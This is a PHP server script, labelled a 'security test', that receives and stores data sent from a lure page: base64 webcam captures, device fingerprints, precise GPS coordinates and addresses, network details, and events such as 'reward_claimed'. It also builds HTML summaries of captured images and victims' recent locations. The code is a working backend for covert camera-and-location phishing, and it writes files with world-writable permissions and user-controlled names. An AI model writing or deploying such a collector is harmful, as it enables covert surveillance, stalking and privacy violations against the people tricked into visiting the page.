<?php
// Enable error reporting for debugging (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Create logs directory if it doesn't exist
$logDir = 'security_test_logs';
if (!file_exists($logDir)) {
    mkdir($logDir, 0777, true);
}

// Create subdirectories for different data types
$imageDir = $logDir . '/images';
$deviceDir = $logDir . '/device_info';
$locationDir = $logDir . '/location';
$sessionsDir = $logDir . '/sessions';

foreach ([$imageDir, $deviceDir, $locationDir, $sessionsDir] as $dir) {
    if (!file_exists($dir)) {
        mkdir($dir, 0777, true);
    }
}

// Get timestamp for filenames
$date = date('Ymd_His');
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Initialize log entry
$logEntry = [
    'timestamp' => $timestamp,
    'ip' => $ip,
    'user_agent' => $userAgent,
    'data_type' => 'unknown'
];

// Handle different data types
$dataType = isset($_POST['data_type']) ? $_POST['data_type'] : 'image';

// Log all received POST data for debugging
$postData = $_POST;
unset($postData['cat']); // Remove image data from log to keep file size manageable
$logEntry['post_data'] = $postData;

// 1. Handle Image Data (original functionality)
if (!empty($_POST['cat'])) {
    $imageData = $_POST['cat'];
    
    // Log receipt
    error_log("Received image data at " . $timestamp . "\r\n", 3, $logDir . "/image_log.log");
    
    // Process image
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    // Generate filename with metadata
    $captureNumber = isset($_POST['capture_id']) ? '_' . $_POST['capture_id'] : '';
    $filename = 'cam_' . $date . $captureNumber . '.jpg'; // Changed to .jpg since it's JPEG
    
    // Save image
    $filepath = $imageDir . '/' . $filename;
    file_put_contents($filepath, $unencodedData);
    
    $logEntry['image_saved'] = $filename;
    $logEntry['data_type'] = 'image';
    
    // If this is an enhanced capture, save metadata
    if (isset($_POST['enhanced_payload'])) {
        $enhancedData = json_decode($_POST['enhanced_payload'], true);
        $metadataFile = $imageDir . '/' . str_replace('.jpg', '_metadata.json', $filename);
        file_put_contents($metadataFile, json_encode($enhancedData, JSON_PRETTY_PRINT));
        $logEntry['metadata_saved'] = basename($metadataFile);
    }
}

// 2. Handle Device Fingerprint Data
if (isset($_POST['device_fingerprint'])) {
    $deviceData = json_decode($_POST['device_fingerprint'], true);
    
    // Generate unique device ID based on fingerprint
    $deviceId = md5(json_encode($deviceData) . $ip);
    $deviceFile = $deviceDir . '/device_' . $date . '_' . $deviceId . '.json';
    
    // Add metadata
    $deviceData['received_timestamp'] = $timestamp;
    $deviceData['ip'] = $ip;
    $deviceData['user_agent'] = $userAgent;
    
    // Save device info
    file_put_contents($deviceFile, json_encode($deviceData, JSON_PRETTY_PRINT));
    
    $logEntry['device_saved'] = basename($deviceFile);
    $logEntry['data_type'] = 'device_info';
    $logEntry['device_id'] = $deviceId;
}

// 3. Handle Location Data
if (isset($_POST['location_data'])) {
    $locationData = json_decode($_POST['location_data'], true);
    
    if (!empty($locationData) && !isset($locationData['error'])) {
        // Generate location file
        $locationFile = $locationDir . '/location_' . $date . '.json';
        
        // Add metadata
        $locationData['received_timestamp'] = $timestamp;
        $locationData['ip'] = $ip;
        
        // Save location
        file_put_contents($locationFile, json_encode($locationData, JSON_PRETTY_PRINT));
        
        $logEntry['location_saved'] = basename($locationFile);
        $logEntry['data_type'] = 'location';
        
        // Also save to CSV for easy analysis
        $csvFile = $locationDir . '/locations.csv';
        $isNewFile = !file_exists($csvFile);
        $fp = fopen($csvFile, 'a');
        
        if ($isNewFile) {
            fputcsv($fp, ['Timestamp', 'IP', 'Latitude', 'Longitude', 'Accuracy', 'City', 'Country', 'Address']);
        }
        
        fputcsv($fp, [
            $timestamp,
            $ip,
            $locationData['lat'] ?? 'N/A',
            $locationData['lng'] ?? 'N/A',
            $locationData['accuracy'] ?? 'N/A',
            $locationData['city'] ?? 'N/A',
            $locationData['country'] ?? 'N/A',
            substr($locationData['address'] ?? 'N/A', 0, 100)
        ]);
        
        fclose($fp);
    }
}

// 4. Handle Network Information
if (isset($_POST['network_data'])) {
    $networkData = json_decode($_POST['network_data'], true);
    
    if (!empty($networkData)) {
        $networkFile = $logDir . '/network_' . $date . '.json';
        $networkData['received_timestamp'] = $timestamp;
        $networkData['ip'] = $ip;
        
        file_put_contents($networkFile, json_encode($networkData, JSON_PRETTY_PRINT));
        $logEntry['network_saved'] = basename($networkFile);
    }
}

// 5. Handle Periodic Updates
if (isset($_POST['periodic_update']) && $_POST['periodic_update'] === 'true') {
    $periodicFile = $logDir . '/periodic_' . $date . '.json';
    $periodicData = [
        'timestamp' => $timestamp,
        'ip' => $ip,
        'captureCount' => $_POST['captureCount'] ?? 'unknown',
        'device_data' => isset($_POST['device_data']) ? json_decode($_POST['device_data'], true) : null,
        'location_data' => isset($_POST['location_data']) ? json_decode($_POST['location_data'], true) : null,
        'network_data' => isset($_POST['network_data']) ? json_decode($_POST['network_data'], true) : null
    ];
    
    file_put_contents($periodicFile, json_encode($periodicData, JSON_PRETTY_PRINT));
    $logEntry['periodic_saved'] = basename($periodicFile);
    $logEntry['data_type'] = 'periodic';
}

// 6. Handle Events (verification_complete, reward_claimed, session_end)
if (isset($_POST['event'])) {
    $event = $_POST['event'];
    $eventFile = $logDir . '/events_' . $date . '.log';
    
    $eventData = [
        'event' => $event,
        'timestamp' => $timestamp,
        'ip' => $ip,
        'data' => $_POST
    ];
    
    // Remove large data from log
    unset($eventData['data']['device_data']);
    unset($eventData['data']['location_data']);
    
    file_put_contents($eventFile, json_encode($eventData) . "\n", FILE_APPEND);
    
    // Special handling for reward_claimed
    if ($event === 'reward_claimed' && isset($_POST['prize'])) {
        $rewardFile = $logDir . '/rewards.log';
        $rewardData = [
            'timestamp' => $timestamp,
            'ip' => $ip,
            'prize' => $_POST['prize'],
            'min' => $_POST['min'] ?? 'N/A',
            'max' => $_POST['max'] ?? 'N/A'
        ];
        
        // Add location if available
        if (isset($_POST['location_data'])) {
            $loc = json_decode($_POST['location_data'], true);
            $rewardData['location'] = $loc['city'] ?? $loc['country'] ?? 'unknown';
        }
        
        file_put_contents($rewardFile, json_encode($rewardData) . "\n", FILE_APPEND);
    }
    
    // Special handling for session_end
    if ($event === 'session_end') {
        $sessionFile = $sessionsDir . '/session_' . $date . '.json';
        $sessionData = [
            'session_end' => $timestamp,
            'ip' => $ip,
            'finalCaptureCount' => $_POST['finalCaptureCount'] ?? 'unknown',
            'device_data' => isset($_POST['device_data']) ? json_decode($_POST['device_data'], true) : null,
            'location_data' => isset($_POST['location_data']) ? json_decode($_POST['location_data'], true) : null
        ];
        
        file_put_contents($sessionFile, json_encode($sessionData, JSON_PRETTY_PRINT));
    }
    
    $logEntry['event'] = $event;
}

// Save master log entry
$masterLog = $logDir . '/master_log_' . date('Y-m-d') . '.log';
file_put_contents($masterLog, json_encode($logEntry) . "\n", FILE_APPEND);

// Optional: Create summary report
if (rand(1, 100) === 1) { // Generate summary occasionally
    generateSummaryReport($logDir);
}

// Return success response
$response = [
    'success' => true,
    'message' => 'Data received',
    'timestamp' => $timestamp,
    'data_type' => $dataType
];

// Add any debug info if requested
if (isset($_GET['debug'])) {
    $response['log_entry'] = $logEntry;
}

header('Content-Type: application/json');
echo json_encode($response);

/**
 * Generate a summary report of collected data
 */
function generateSummaryReport($logDir) {
    $summaryFile = $logDir . '/summary_' . date('Y-m-d_H-i-s') . '.html';
    
    $html = '<!DOCTYPE html>
<html>
<head>
    <title>Security Test Summary</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #1a1a1a; color: #fff; }
        h1 { color: #FFD700; }
        h2 { color: #00FF00; margin-top: 30px; }
        table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
        th { background: #333; color: #FFD700; padding: 10px; text-align: left; }
        td { background: #222; padding: 8px; border: 1px solid #444; }
        .stats { background: #0f2027; padding: 15px; border-radius: 5px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>🔐 Security Test Summary Report</h1>
    <div class="stats">
        <p>Generated: ' . date('Y-m-d H:i:s') . '</p>';
    
    // Count files
    $imageCount = count(glob($logDir . '/images/*.jpg'));
    $deviceCount = count(glob($logDir . '/device_info/*.json'));
    $locationCount = count(glob($logDir . '/location/*.json'));
    
    $html .= '<p>📸 Images captured: ' . $imageCount . '</p>';
    $html .= '<p>📱 Device fingerprints: ' . $deviceCount . '</p>';
    $html .= '<p>📍 Location data points: ' . $locationCount . '</p>';
    $html .= '</div>';
    
    // Show recent locations
    $locations = glob($logDir . '/location/*.json');
    rsort($locations);
    $recentLocations = array_slice($locations, 0, 10);
    
    if (!empty($recentLocations)) {
        $html .= '<h2>📍 Recent Locations</h2><table>';
        $html .= '<tr><th>Time</th><th>Coordinates</th><th>Accuracy</th><th>Address</th></tr>';
        
        foreach ($recentLocations as $locFile) {
            $data = json_decode(file_get_contents($locFile), true);
            $html .= '<tr>';
            $html .= '<td>' . ($data['received_timestamp'] ?? 'N/A') . '</td>';
            $html .= '<td>' . ($data['lat'] ?? 'N/A') . ', ' . ($data['lng'] ?? 'N/A') . '</td>';
            $html .= '<td>' . ($data['accuracy'] ?? 'N/A') . 'm</td>';
            $html .= '<td>' . substr(($data['address'] ?? 'N/A'), 0, 50) . '</td>';
            $html .= '</tr>';
        }
        $html .= '</table>';
    }
    
    $html .= '</body></html>';
    
    file_put_contents($summaryFile, $html);
}

exit();
?>